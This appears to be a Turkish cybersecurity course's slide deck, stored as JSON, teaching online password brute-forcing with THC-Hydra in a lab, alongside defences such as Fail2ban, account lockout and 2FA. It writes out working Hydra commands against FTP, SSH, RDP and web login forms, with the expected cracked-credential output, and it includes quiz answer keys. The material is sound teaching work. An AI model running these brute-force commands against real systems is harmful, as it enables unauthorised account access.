@@ -1,0 +1,281 @@
+[
+  {
+    "baslik": "Siber Güvenlik: Hafta 12",
+    "altbaslik": "Ağ ve Servis Parola Saldırıları: Çevrimiçi Hydra Testleri",
+    "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: Kimlik Doğrulama Saldırıları ve Servis Güvenliği\nHaftalık Odak: Çevrimiçi Brute Force, THC-Hydra, SSH/FTP Saldırıları ve 2FA Savunması\nHedef: Ağ servislerine yönelik canlı parola saldırılarını test etmek ve savunma kurmak.",
+    "gorsel": {
+      "type": "image",
+      "query": "hydra brute force password attack terminal network server"
+    }
+  },
+  {
+    "baslik": "Neden Bu Konuyu Öğreniyoruz?",
+    "altbaslik": "Sektörel Bağlam: İnternete Açık Yönetim Portları",
+    "icerik": "Şirketlerin sunucularındaki SSH, FTP, RDP portları uzaktan yönetim için internete açılır.\n- Saldırganlar otomatik botlarla bu portlara 7/24 parola dener.\n- Zayıf bir 'admin/123456' parolası tüm şirketin dakikalar içinde hacklenmesine yeter.\nUzmanlar Hydra ile bu zayıflıkları denetler ve savunma önlemleri geliştirir.",
+    "gorsel": {
+      "type": "image",
+      "query": "ssh brute force attack logs terminal server"
+    }
+  },
+  {
+    "baslik": "Haftanın Öğrenme Kazanımları",
+    "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?",
+    "icerik": "1. Çevrimdışı (Hashcat) ve Çevrimiçi (Hydra) parola saldırı farklarını açıklar.\n2. Ağ servislerine (SSH, FTP, HTTP-POST) yönelik kaba kuvvet mantığını kavrar.\n3. THC-Hydra komut sözdizimini (-L, -P, -t, -V) hatasız kullanır.\n4. Hedef sanal makinenin FTP ve SSH servis parolalarını canlı kırar.\n5. Fail2ban, Rate Limiting ve 2FA savunma mekanizmalarını açıklar.",
+    "gorsel": {
+      "type": "image",
+      "query": "learning objectives hydra password cracking checklist"
+    }
+  },
+  {
+    "baslik": "Çevrimiçi (Online) Parola Saldırılarının Doğası",
+    "altbaslik": "Canlı Servislerle Mücadele",
+    "icerik": "Çevrimdışı kırmada dosya bilgisayarınızdadır; çevrimiçi kırmada ise ağ üzerinden canlı sunucuya istek atılır.\nZorlukları:\n- Ağ Gecikmesi (Latency): Her deneme ağdan geçer.\n- Sunucu Korumaları: Hesap kilitleme (Account Lockout) ve IP engelleme (Fail2ban).\n- Log Kayıtları: Her başarısız deneme sunucu loglarına düşer.",
+    "gorsel": {
+      "type": "image",
+      "query": "online password attack latency server connection diagram"
+    }
+  },
+  {
+    "baslik": "THC-Hydra Nedir?",
+    "altbaslik": "Dünyanın En Hızlı Ağ Giriş Kırıcısı",
+    "icerik": "Hydra, 50'den fazla ağ protokolünü (SSH, FTP, HTTP, Telnet, RDP, MySQL, SMB) destekleyen çok iş parçacıklı (Multi-threaded) çevrimiçi parola kırma aracıdır.\nEşzamanlı (Parallel) çalışma yeteneği sayesinde aynı anda onlarca şifreyi paralel olarak dener.",
+    "gorsel": {
+      "type": "image",
+      "query": "thc hydra logo terminal network login cracker"
+    }
+  },
+  {
+    "baslik": "Hydra Komut Sözdizimi ve Parametreleri",
+    "altbaslik": "Parametreleri Doğru Kullanmak",
+    "icerik": "hydra -L users.txt -P pass.txt 192.168.1.50 ftp -t 4 -V\n- -l user : Tek bir kullanıcı adı\n- -L dosya : Kullanıcı adları listesi\n- -p sifre : Tek bir parola\n- -P dosya : Parolalar listesi (Wordlist)\n- -t 4 : Eşzamanlı iş parçacığı sayısı (Thread)\n- -V : Her denemeyi ekranda ayrıntılı göster (Verbose)",
+    "gorsel": {
+      "type": "image",
+      "query": "hydra syntax cheat sheet parameters terminal"
+    }
+  },
+  {
+    "baslik": "Medusa ve Ncrack Alternatifleri",
+    "altbaslik": "Diğer Çevrimiçi Araçlar",
+    "icerik": "- Medusa: Hydra'ya benzer, modüler ve kararlı paralel giriş deneme aracıdır.\n- Ncrack: Nmap ekibi tarafından geliştirilmiş, yüksek hızlı ağ kimlik doğrulama test aracıdır.\nHer üç araç da sızma testlerinde servis parola denetimleri için kullanılır.",
+    "gorsel": {
+      "type": "image",
+      "query": "medusa ncrack hydra network tools comparison"
+    }
+  },
+  {
+    "baslik": "Savunma: Kaba Kuvvet Saldırıları Nasıl Durdurulur?",
+    "altbaslik": "4 Katmanlı Savunma Kalkanı",
+    "icerik": "1. Hesap Kilitleme Politikası: 5 yanlış denemede hesabı 15 dakika kilitle.\n2. Fail2ban: Arka arkaya başarısız giriş yapan IP adresini güvenlik duvarında (iptables) otomatik blokla.\n3. 2FA / MFA (Çok Faktörlü Kimlik Doğrulama): Şifre bilinse dahi telefon onayı olmadan girişi reddet!\n4. Port Değiştirme / VPN: SSH portunu (22) dış dünyaya kapatıp sadece VPN arkasından erişime izin ver.",
+    "gorsel": {
+      "type": "image",
+      "query": "two factor authentication 2fa phone notification shield"
+    }
+  },
+  {
+    "baslik": "Uygulama Laboratuvarı: Hydra ile Kırma",
+    "altbaslik": "Laboratuvar Hedeflerimiz",
+    "icerik": "Laboratuvarımızda:\n- Hedef Sunucu: 192.168.1.50 (Sunucu 2 Metasploitable)\n1. Hedefe özel kullanıcı ve parola listesi hazırlayacağız.\n2. Hydra ile 192.168.1.50 FTP servisini kıracağız.\n3. Hydra ile SSH servisini kırıp bulunan parolayla terminalden giriş yapacağız.",
+    "gorsel": {
+      "type": "image",
+      "query": "students network laboratory password testing hydra"
+    }
+  },
+  {
+    "baslik": "Uygulama 1: Test Listelerimizi Hazırlama",
+    "altbaslik": "users.txt ve passwords.txt",
+    "icerik": "Masaüstünde hydralab klasörü açalım:\nmkdir -p ~/Desktop/hydralab && cd ~/Desktop/hydralab\nKullanıcı listesi oluşturalım:\ncat << 'EOF' > users.txt\nadmin\nroot\nmsfadmin\ntest\nEOF\nParola listesi oluşturalım:\ncat << 'EOF' > passwords.txt\n123456\npassword\nmsfadmin\nsiber2026\nEOF",
+    "gorsel": {
+      "type": "image",
+      "query": "cat command writing wordlist files terminal"
+    }
+  },
+  {
+    "baslik": "Uygulama 2: Hydra ile FTP Parolası Kırma",
+    "altbaslik": "Port 21 FTP Saldırısı",
+    "icerik": "FTP servisine karşı saldırıyı başlatalım:\nhydra -L users.txt -P passwords.txt 192.168.1.50 ftp -t 4 -V\nBeklenen Başarı Çıktısı:\n[21][ftp] host: 192.168.1.50 login: msfadmin password: msfadmin\n1 of 1 target successfully completed, 1 valid password found!",
+    "gorsel": {
+      "type": "image",
+      "query": "hydra ftp crack success terminal green output"
+    }
+  },
+  {
+    "baslik": "Uygulama 3: Hydra ile SSH Parolası Kırma",
+    "altbaslik": "Port 22 SSH Saldırısı",
+    "icerik": "Kullanıcı adını bildiğimiz senaryoda tek kullanıcıyla SSH kıralım:\nhydra -l msfadmin -P passwords.txt 192.168.1.50 ssh -t 4 -V\nBeklenen Çıktı:\n[22][ssh] host: 192.168.1.50 login: msfadmin password: msfadmin",
+    "gorsel": {
+      "type": "image",
+      "query": "hydra ssh password cracked terminal output"
+    }
+  },
+  {
+    "baslik": "Uygulama 4: Bulunan Parola ile SSH Girişi",
+    "altbaslik": "Doğrulama Adımı",
+    "icerik": "Kırdığımız parola ile hedef sisteme bağlanalım:\nssh msfadmin@192.168.1.50\nParola sorulduğunda bulunan 'msfadmin' yazıp sisteme girin!\nwhoami\nexit",
+    "gorsel": {
+      "type": "image",
+      "query": "ssh login terminal connected linux prompt"
+    }
+  },
+  {
+    "baslik": "Sık Yapılan Hatalar ve İpuçları",
+    "altbaslik": "Hydra Kullanımında Dikkat Edilecekler",
+    "icerik": "1. Büyük/Küçük Harf Hatası: -L dosya yolu alır, -l tek bir kelime alır. Karıştırılırsa 'File not found' hatası verir.\n2. Yüksek Thread Sayısı (-t 64): Sınıftaki 60 kişi aynı anda yüksek thread açarsa hedef sunucu kilitlenir; mutlaka -t 4 kullanılmalıdır.\n3. Servis Adı: Komutun sonuna mutlaka 'ftp', 'ssh' gibi servis adı yazılmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "troubleshooting hydra parameters error warning checklist"
+    }
+  },
+  {
+    "baslik": "Sektörel Vaka: Mirai Botnet Parola Taraması",
+    "altbaslik": "Varsayılan Şifrelerin Felaketi",
+    "icerik": "Vaka: Mirai zararlısı dünya çapında 600.000 IP kamera ve DVR cihazını hackleyip dev bir zombi ordusu kurdu.\nNasıl Yaptı? Cihazlardaki açık Telnet portlarına sadece 60 adet bilinen varsayılan şifreyi (admin/admin, root/xc3511 vb.) Hydra mantığıyla denedi!\nSonuç: Bu zombi ordusuyla tarihin en büyük 1 Tbps'lik DDoS saldırısı gerçekleştirildi.",
+    "gorsel": {
+      "type": "image",
+      "query": "mirai botnet iot devices security breach ddos attack"
+    }
+  },
+  {
+    "baslik": "Vaka Analizi: Varsayılan Parola Değişimi",
+    "altbaslik": "Çıkarılan Mühendislik Dersi",
+    "icerik": "Ders: Sisteme takılan her kamera, modem veya sunucunun varsayılan fabrika parolası derhal değiştirilmelidir.\n- Kurumlarda otomatik tarayıcılar kurularak zayıf/varsayılan şifre kullanan cihazlar tespit edilip ağdan izole edilmelidir.",
+    "gorsel": {
+      "type": "image",
+      "query": "change default password security alert router"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 1",
+    "altbaslik": "Araç Tanıma",
+    "icerik": "Soru: SSH, FTP ve HTTP gibi açık ağ servislerine karşı çok iş parçacıklı çevrimiçi parola kırma saldırısı yapan popüler araç hangisidir?\nA) Wireshark\nB) THC-Hydra\nC) Ping\nD) Nano\n\nDoğru Cevap: B (THC-Hydra)",
+    "gorsel": {
+      "type": "image",
+      "query": "quiz question multiple choice exam board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 2",
+    "altbaslik": "Hydra Parametreleri",
+    "icerik": "Soru: Hydra komutunda bir parola listesi (Wordlist dosyası) belirtmek için hangi parametre kullanılır?\nA) -p\nB) -P (Büyük P)\nC) -u\nD) -U\n\nDoğru Cevap: B (-P)",
+    "gorsel": {
+      "type": "image",
+      "query": "hydra parameter question multiple choice"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 3",
+    "altbaslik": "Savunma Önlemleri",
+    "icerik": "Soru: Arka arkaya 5 kez yanlış parola giren bir IP adresini güvenlik duvarında otomatik olarak geçici engelleyen Linux savunma servisi hangisidir?\nA) Fail2ban\nB) Apache\nC) Telnet\nD) Mysql\n\nDoğru Cevap: A (Fail2ban)",
+    "gorsel": {
+      "type": "image",
+      "query": "fail2ban linux service question board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 4",
+    "altbaslik": "Kimlik Doğrulama",
+    "icerik": "Soru: Parola doğru girilse dahi kullanıcının telefonuna gelen onay kodu olmadan sisteme girişi engelleyen güvenlik teknolojisine ne ad verilir?\nA) SSH\nB) 2FA / MFA (İki Faktörlü Doğrulama)\nC) DMZ\nD) NAT\n\nDoğru Cevap: B (2FA / MFA)",
+    "gorsel": {
+      "type": "image",
+      "query": "mfa 2fa security question test"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 5",
+    "altbaslik": "Performans Yönetimi",
+    "icerik": "Soru: Hydra'da hedef sunucuyu kilitlememek için eşzamanlı iş parçacığı sayısını belirleyen parametre hangisidir?\nA) -s\nB) -t (Thread)\nC) -v\nD) -f\n\nDoğru Cevap: B (-t)",
+    "gorsel": {
+      "type": "image",
+      "query": "thread parameter question board"
+    }
+  },
+  {
+    "baslik": "Sınıf İçi Tartışma ve Uygulama",
+    "altbaslik": "Hydra ile Gizli Kullanıcıyı Bulma",
+    "icerik": "Uygulama Görevi:\nHedef sunucuda eğitmen tarafından yeni bir kullanıcı açıldı.\n- 10 isimlik bir liste hazırlayıp Hydra ile kullanıcıyı ve şifresini ilk bulan öğrenci el kaldırsın!",
+    "gorsel": {
+      "type": "image",
+      "query": "students competition classroom coding linux challenge"
+    }
+  },
+  {
+    "baslik": "RDP ve Windows Giriş Saldırıları",
+    "altbaslik": "Port 3389 Uzak Masaüstü Testleri",
+    "icerik": "Hydra sadece Linux değil, Windows Server RDP (Uzak Masaüstü) servisine karşı da kaba kuvvet yapabilir:\nhydra -l Administrator -P pass.txt rdp://192.168.1.10\nWindows Savunması:\nGrup İlkesi (GPO) üzerinden 'Hesap Kilitleme Eşiği' (Account Lockout Threshold) 3 hatalı denemeye ayarlanmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "windows remote desktop rdp brute force login screen"
+    }
+  },
+  {
+    "baslik": "HTTP Form Giriş Saldırıları (Web Brute Force)",
+    "altbaslik": "Hydra ile Web Login Kırma",
+    "icerik": "Web sitelerindeki kullanıcı girişi formlarına karşı Hydra kullanımı:\nhydra 192.168.1.20 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed\" -L users.txt -P pass.txt\nParametre Formülü:\n[Giriş_URL'si] : [Form_Alanları] : [Başarısız_Olduğunda_Çıkan_Metin]",
+    "gorsel": {
+      "type": "image",
+      "query": "hydra http post form brute force command terminal"
+    }
+  },
+  {
+    "baslik": "CAPTCHA ve Bot Koruması",
+    "altbaslik": "Otomasyonu Durduran İnsan Doğrulaması",
+    "icerik": "CAPTCHA (reCAPTCHA, Cloudflare Turnstile):\nForm gönderilmeden önce isteğin bir insan mı yoksa otomatik bir Hydra/Python botu mu olduğunu test eder.\n- Şekil seçme, bulmaca veya görünmez davranış analizi ile botların şifre denemesini tamamen imkansız kılar.",
+    "gorsel": {
+      "type": "image",
+      "query": "recaptcha captcha bot detection security shield"
+    }
+  },
+  {
+    "baslik": "Parola Güvenliği Denetim Raporu",
+    "altbaslik": "Yöneticiye Sunum",
+    "icerik": "Ağ parola testleri sonucunda hazırlanan rapor şunları içerir:\n- Zayıf parolaya sahip kullanıcıların listesi\n- Varsayılan parolası değiştirilmemiş IoT cihazları ve sunucular\n- 2FA aktif edilmemiş kritik yönetim hesapları\n- Acil parola sıfırlama ve politika güncelleme önerileri.",
+    "gorsel": {
+      "type": "image",
+      "query": "security audit report password assessment document"
+    }
+  },
+  {
+    "baslik": "Haftalık Konu Özeti",
+    "altbaslik": "Bu Hafta Neler Öğrendik?",
+    "icerik": "- Çevrimiçi parola saldırıları canlı ağ protokollerini hedef alır.\n- THC-Hydra hızlı ve çok yönlü bir parola deneme aracıdır.\n- -l/-L ve -p/-P parametreleri tekil kelime ile dosya listesi ayrımını yapar.\n- Fail2ban, hesap kilitleme ve 2FA kaba kuvvet saldırılarını durdurmanın en etkin yoludur.",
+    "gorsel": {
+      "type": "image",
+      "query": "summary concept mind map review"
+    }
+  },
+  {
+    "baslik": "Parola Karmaşıklık Testleri ve Entropi",
+    "altbaslik": "Parolanın Matematiksel Direnci",
+    "icerik": "Parola Entropisi (Bit):\nBir parolanın rastgelelik ve tahmin edilemezlik derecesidir.\n- Düşük Entropi (30 bit): 'siber123' -> Hydra ile 1 saniyede kırılır.\n- Yüksek Entropi (80+ bit): 'xK9#mQ2!vL8@' -> Kaba kuvvetle kırılması yüzyıllar sürer.\nKurumlar kullanıcıların yüksek entropili parola belirlemesini zorunlu kılmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "password entropy calculation bits math security"
+    }
+  },
+  {
+    "baslik": "Merkezi Kimlik Yönetimi: Active Directory ve Kerberos",
+    "altbaslik": "Kurumsal Kimlik Doğrulama",
+    "icerik": "Şirketlerde her sunucuya ayrı şifre koymak yerine Active Directory (AD) / LDAP kullanılır.\n- Kerberos Protokolü ile bilet tabanlı (Ticket) güvenli kimlik doğrulama sağlanır.\n- Ağ üzerinden açık metin şifre geçişi tamamen engellenir ve Hydra saldırıları boşa çıkarılır.",
+    "gorsel": {
+      "type": "image",
+      "query": "active directory ldap kerberos domain controller security"
+    }
+  },
+  {
+    "baslik": "Gelecek Haftaya Bakış",
+    "altbaslik": "Hafta 13: Web Zafiyetleri: Fuzzing, XSS ve Komut Enjeksiyonu",
+    "icerik": "Ön Hazırlık:\n- Web sunuculardaki gizli sayfalar Gobuster ile nasıl taranır?\n- Cross-Site Scripting (XSS) ile tarayıcıda zararlı kod nasıl çalıştırılır?\n- Komut Enjeksiyonu (Command Injection) ile /etc/passwd nasıl okunur?",
+    "gorsel": {
+      "type": "image",
+      "query": "xss cross site scripting web security command injection"
+    }
+  },
+  {
+    "baslik": "Çıkış Bileti (Exit Ticket)",
+    "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız",
+    "icerik": "Günün Sorusu:\n'Bir şirketin web login paneline saniyede 100 parola denemesi yapan bir saldırganı engellemek için sistem mimarisine hangi 2 güvenlik kontrolü eklenmelidir?'\n\nCevabınızı kâğıda yazıp teslim ediniz.",
+    "gorsel": {
+      "type": "image",
+      "query": "exit ticket paper feedback classroom student"
+    }
+  }
+]
